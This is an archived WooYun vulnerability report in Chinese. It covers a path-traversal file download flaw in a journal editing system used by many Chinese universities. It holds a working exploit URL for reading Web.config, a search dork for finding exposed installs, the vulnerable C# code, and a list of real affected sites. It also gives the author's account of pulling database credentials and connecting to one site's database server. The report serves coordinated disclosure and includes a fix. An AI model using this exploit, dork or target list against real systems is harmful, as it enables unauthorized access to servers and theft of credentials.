{"id": 53685, "wybug_id": "wooyun-2014-066795", "wybug_title": "多所高校和科研机构某系统任意文件下载漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "blackexp", "wybug_date": "2014-07-03 11:44", "wybug_open_date": "2014-10-01 11:46", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向公众公开  简要描述： 如题 详细说明：  三才期刊采编系统 存在任意文件下载漏洞示例：http://www.jdxb.cn/oa/pdfdow.aspx?Type=pdf&FileName=../../Web.configGoogle: inurl:/oa/pdfdow.aspx?Type=pdf\n\n问题代码：/oa/pdfdow.aspx.cs\nelse if (Request.QueryString[\"Type\"] == \"pdf\")            {                if (!string.IsNullOrEmpty(Request.QueryString[\"FileName\"]))                {                    string openulr = Server.MapPath(strPath + \"/\" + Request.QueryString[\"FileName\"].ToString());                    if (File.Exists(openulr))                    {                        System.IO.Stream iStream = null;                        // Buffer to read 10K bytes in chunk:                        byte[] buffer = new Byte[1000000];                        // Length of the file:                        int length;                        // Total bytes to read:                        long dataToRead;                        string filepath = openulr;                        // Identify the file name.                        string filetype = System.IO.Path.GetFileName(filepath);                        try                        {                            // Open the file.                            iStream = new System.IO.FileStream(filepath, System.IO.FileMode.Open,                                        System.IO.FileAccess.Read, System.IO.FileShare.Read);                            // Total bytes to read:                            dataToRead = iStream.Length;                            Response.ContentType = \"application/octet-stream\";                            Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(Request.QueryString[\"FileName\"].ToString(), Encoding.UTF8).ToString().Trim());                            // Read the bytes.                            while (dataToRead > 0)                            {                                // Verify that the client is connected.                                if (Response.IsClientConnected)                                {                                    // Read the data in buffer.                                    length = iStream.Read(buffer, 0, 1000000);                                    // Write the data to the current output stream.                                    Response.OutputStream.Write(buffer, 0, length);                                    // Flush the data to the HTML output.                                    Response.Flush();                                    buffer = new Byte[1000000];                                    dataToRead = dataToRead - length;                                }                                else                                {                                    //prevent infinite loop if user disconnects                                    dataToRead = -1;                                }                            }                        }                        catch (Exception ex)                        {                            // Trap the error, if any.                            Response.Write(\"Error : \" + ex.Message);                        }                        finally                        {                            if (iStream != null)                            {                                //Close the file.                                iStream.Close();                                Response.End();                            }                        }                    }                }            }            base.OnLoad(e);        }    }}\n没有对参数:FileName 进行过滤，直接返回文件。涉及的网站：http://tis.hrbeu.edu.cnhttp://www.cjebm.org.cnhttp://xbskb.ysu.edu.cnhttp://www.j-smu.comhttp://www.hxyxqk.com.cnhttp://heuxb.hrbeu.edu.cnhttp://lkkf.njfu.edu.cnhttp://www.psytxjx.comhttp://www.xfcjwkzazhi.cnhttp://www.zgpwzz.comhttp://jee.ieecas.cnhttp://xxzz.cintcm.comhttp://www.ydsjjs.comhttp://yxxb.xjtu.edu.cnhttp://jxyj.ysu.edu.cnhttp://xb.hznu.edu.cnhttp://emc.hrbust.edu.cnhttp://www.zgxxwkzz.comhttp://www.syfsxzz.com.cnhttp://gjzy.cintcm.comhttp://www.cjam.net.cnhttp://www.qbzz.orghttp://www.cibj.comhttp://www.zgmnwk.comhttp://xbskb.jssvc.edu.cnhttp://www.jwit.org.cnhttp://xbskb.jssvc.edu.cnhttp://xbzrb.tjujournals.comhttp://www.cjcep.comhttp://www.fmmuxb.cnhttp://dlxb.nefu.edu.cnhttp://qhxb.lib.tsinghua.edu.cnhttp://slgc.nefu.edu.cnhttp://jjlyj.csuft.edu.cnhttp://hlgxb.hrbust.edu.cnhttp://www.cjrccm.comhttp://xbzkb.jssvc.edu.cnhttp://xuebao.ysu.edu.cnhttp://www.ddgzyckx.comhttp://www.lsjg.cnhttp://jhau.paperopen.comhttp://skxb.csuft.edu.cnhttp://zgwstj.paperonce.orghttp://nldxb.njfu.edu.cnhttp://xuebao.zjc.edu.cnhttp://journal.lut.cn官方也给出客户列表，但有些站已关闭\n\n\n\n\n\n   漏洞证明：  找一个网站近一步测试xbskb.jssvc.edu.cn下载网站配置文件：http://xbskb.jssvc.edu.cn/oa/pdfdow.aspx?Type=pdf&FileName=../../Web.config找到数据库信息\n\n数据库连的是本机，正好其1433端口对外开放，连之\n\n   修复方案：  对文件读取目录做限制，且对FileName做过滤   版权声明：转载请注明来源 blackexp@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-08 10:59 厂商回复： CNVD确认并复现所述情况（验证情况由上海交通大学协助完成），后续根据测实例例情况转报给教育网应急组织统一处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}